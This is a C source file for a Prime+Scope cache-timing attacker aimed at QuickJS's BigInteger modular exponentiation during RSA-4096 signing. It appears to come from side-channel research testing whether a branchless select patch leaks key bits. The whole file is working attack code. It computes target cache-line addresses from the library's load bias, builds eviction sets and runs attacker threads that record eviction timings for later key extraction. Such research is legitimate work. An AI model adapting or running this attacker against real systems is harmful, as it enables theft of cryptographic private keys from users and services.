/* Prime+Scope attacker against the branchless `selectBigInt` patch inside a
 * real RSA-4096 BigInteger.modExp loop. Same victim and same two target cache
 * lines as quickjs_select_rsa_fr.c (bf_add_internal's full-arithmetic path and
 * bf_logic_or's stub) -- only the measurement primitive differs.
 *
 * WHY P+S HERE (see openpgp_patch_rsa/PROGRESS.md for the full trail):
 * the FR attacker's probe period bottoms out at ~1778 cycles, because each
 * probe only detects an access landing between its flush and its reload, so
 * shrinking FR_wait trades sensitivity away for resolution roughly 1:1 (a
 * sweep over WAITING_TIME=2000..100 raised the sample rate ~2x while dropping
 * observed hits ~3x). Against a ~280,000-cycle modExp iteration that yields
 * only ~1.9-3.0 hits per SELECT call -- the entire dynamic range available to
 * classify a bit.
 *
 * PS_profile_once (src/attack/prime_probe.c) is *event-driven* rather than
 * sampled: it spins on a single timed access to the scope line and records a
 * (tsc, latency) pair only when an eviction actually occurs, re-priming after
 * each. Its loop period is one timed access rather than FR's flush+wait+reload,
 * so it resolves individual accesses within a single SELECT call instead of
 * quantizing the whole call to ~2 samples.
 *
 * The tradeoff, stated plainly: P+S is *set*-granular where FR is line-granular,
 * so anything else mapping to the same LLC set is counted too. bf_add_internal
 * was already proven non-exclusive (shared with bf_mul/bf_divrem's internal
 * add/sub steps), and P+S can only widen that. bf_logic_or is the channel worth
 * watching -- exactly one caller in the whole library (js_binary_arith_bigint's
 * OP_or case), reached only by SELECT's own `|`.
 *
 * Unlike quickjs_rsa.c/quickjs_rsa_key_pool.c, this does NOT need
 * identify_quickjs_target_sets: those profile every L3 set because the
 * bytecode-handler line's address is uncertain. Here both targets are exact
 * addresses derived from the shared library's load bias (ASLR is disabled by
 * setup.sh, so victim and attacker map libquickjs.so identically), so
 * prepare_evset() can build an eviction set for the known address directly.
 */
#include "arch.h"
#include "cache.h"
#include "cache/cache_param.h"
#include "cache/helper_thread.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "quickjs_runtime.h"
#include "quickjs/quickjs-libc.h"
#include "shared_memory.h"

#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

enum { cache_line_count = 2, profile_iterations = 1 << 20 };

static uint64_t victim_runs = 5;
static uint64_t key_id = 0;
/* One RSA-4096 sign is ~900ms (~2.2e9 cycles at the 2.4GHz setup.sh pins);
 * 4e9 leaves margin. P+S records only eviction events, so over-running the
 * budget costs wall time but adds no trace noise -- unlike the FR attacker,
 * which needed an early SYNC_CTX_PAUSE break to avoid diluting its sampled
 * trace with post-signing idle. */
static uint64_t max_exec_cycles = (uint64_t)4e9;
static const char *test_name = "quickjs_select_rsa_ps";

static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];

static PS_attacker_thread_config_t pt_bf_add, pt_bf_logic_or;
static pthread_barrier_t attacker_threads_barrier;

/* Must match quickjs_select_rsa_fr.c's constants of the same name -- same
 * build, same libquickjs.so. Recompute (nm/addr2line, see that file) if the
 * QuickJS source or build flags change. */
static const uintptr_t bf_add_internal_full_path_file_offset = 0xb0065;
static const uintptr_t bf_logic_or_file_offset = 0xb1220;
static const uintptr_t js_std_eval_file_offset = 0x18da0;

static uintptr_t target_bf_add;
static uintptr_t target_bf_logic_or;

static void get_select_targets(void) {
	uintptr_t load_bias =
	    (uintptr_t)&js_std_eval_file - js_std_eval_file_offset;
	target_bf_add =
	    (load_bias + bf_add_internal_full_path_file_offset) & CACHE_LINE_MASK;
	target_bf_logic_or =
	    (load_bias + bf_logic_or_file_offset) & CACHE_LINE_MASK;
	log_info("libquickjs.so load bias: %lx, target bf_add_internal "
	         "(full-path) cache line: %lx, target bf_logic_or cache line: %lx",
	         load_bias,
	         target_bf_add,
	         target_bf_logic_or);
}

/* Build eviction sets for both known target addresses. Returns 1 on success. */
static int build_select_evsets(void) {
	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper thread");
		return 0;
	}

	static const int retry = 4;
	uint8_t *targets[cache_line_count] = {
		(uint8_t *)target_bf_add,
		(uint8_t *)target_bf_logic_or,
	};
	EVSet **evsets[cache_line_count] = { &pt_bf_add.evset,
		                                 &pt_bf_logic_or.evset };
	const char *labels[cache_line_count] = { "bf_add_internal", "bf_logic_or" };

	for (int i = 0; i < cache_line_count; ++i) {
		for (int r = 0; r < retry && *evsets[i] == NULL; ++r) {
			*evsets[i] = prepare_evset(targets[i], &hctrl);
		}
		if (*evsets[i] == NULL) {
			log_error("Failed to build evset for %s", labels[i]);
			stop_helper_thread(&hctrl);
			return 0;
		}
		log_info("Built evset for %s: %p", labels[i], (void *)*evsets[i]);
	}

	stop_helper_thread(&hctrl);
	return 1;
}

static void profile_select_rsa(void) {
	pthread_t thread0 = 0, thread1 = 0;
	char test_key_name[256];
	int err;

	if (pthread_barrier_init(&attacker_threads_barrier, NULL, 2) != 0) {
		log_error("Error initializing attacker thread barrier");
		return;
	}

	/* key-pool-style naming, matching quickjs_select_rsa_fr.c so the same
	 * evaluation scripts can point at either attack's output. */
	snprintf(test_key_name,
	         sizeof(test_key_name),
	         "%s/%s_key%05lu",
	         test_name,
	         test_name,
	         (unsigned long)key_id);
	pt_bf_add.test_name = test_key_name;
	pt_bf_logic_or.test_name = test_key_name;

	/* quickjs_eval_buf_loop passes sync_ctx.data through putenv(), matching
	 * openpgp_select_rsa.js's KEY_ID mechanism. */
	snprintf((char *)sync_ctx.data,
	         sync_ctx_data_size,
	         "KEY_ID=%lu",
	         (unsigned long)key_id);

	/* matches the victim's (A) init barrier; PS_profile_once handles the
	 * per-round START/PAUSE handshake internally for slot 0. */
	log_info("Prime+Scope waiting for victim warm-up");
	pthread_barrier_wait(sync_ctx.barrier);
	log_info("Prime+Scope warm-up done");

	err = pthread_create(&thread0, NULL, PS_attacker_thread, &pt_bf_add);
	if (err != 0)
		log_error("can't create bf_add thread :[%s]", strerror(err));

	err = pthread_create(&thread1, NULL, PS_attacker_thread, &pt_bf_logic_or);
	if (err != 0)
		log_error("can't create bf_logic_or thread :[%s]", strerror(err));

	pthread_join(thread0, NULL);
	pthread_join(thread1, NULL);

	pthread_barrier_destroy(&attacker_threads_barrier);

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

static void parse_env_u64(const char *name, uint64_t *out) {
	const char *v = getenv(name);
	if (v == NULL)
		return;
	char *endptr;
	errno = 0;
	uint64_t value = strtoull(v, &endptr, 10);
	if (errno == 0 && endptr != v && *endptr == '\0')
		*out = value;
}

int main(int argc, char **argv) {
	get_config();
	init_sync_ctx(QUICKJS_PROJ_ID);
	quickjs_get_bytecode_handler_cacheline();
	get_select_targets();

	srand(time(NULL));

	parse_env_u64("VICTIM_RUNS", &victim_runs);
	parse_env_u64("KEY_ID", &key_id);
	parse_env_u64("ROUND_CYCLES", &max_exec_cycles);

	if (argc > 1) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(argv[1], &endptr, 10);
		if (errno == 0 && endptr != argv[1] && *endptr == '\0' && value > 0) {
			victim_runs = value;
		} else {
			log_error("Invalid victim_runs argument '%s'", argv[1]);
			return -1;
		}
	}

	log_info("Config: victim_runs=%lu, key_id=%lu, max_exec_cycles=%lu",
	         (unsigned long)victim_runs,
	         (unsigned long)key_id,
	         (unsigned long)max_exec_cycles);

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!");
		return 1;
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	/* slot 0 = bf_add_internal, slot 1 = bf_logic_or -- same slot order as
	 * quickjs_select_rsa_fr.c, so evaluation/extract_select_rsa.py's
	 * trace[0]/trace[1] indexing works unchanged. */
	PS_thread_config_init(pt_bf_add);
	pt_bf_add.label = "bf_add_internal";
	pt_bf_add.slot = 0;
	pt_bf_add.pin_cpu = -1;
	pt_bf_add.target = (uint8_t *)target_bf_add;

	PS_thread_config_init(pt_bf_logic_or);
	pt_bf_logic_or.label = "bf_logic_or";
	pt_bf_logic_or.slot = 1;
	pt_bf_logic_or.pin_cpu = -1;
	pt_bf_logic_or.target = (uint8_t *)target_bf_logic_or;

	if (!build_select_evsets()) {
		log_error("Could not build evsets for bf_add_internal / bf_logic_or");
		/* Release the victim rather than leaving it parked on its barrier. */
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return -1;
	}

	profile_select_rsa();
	return 0;
}
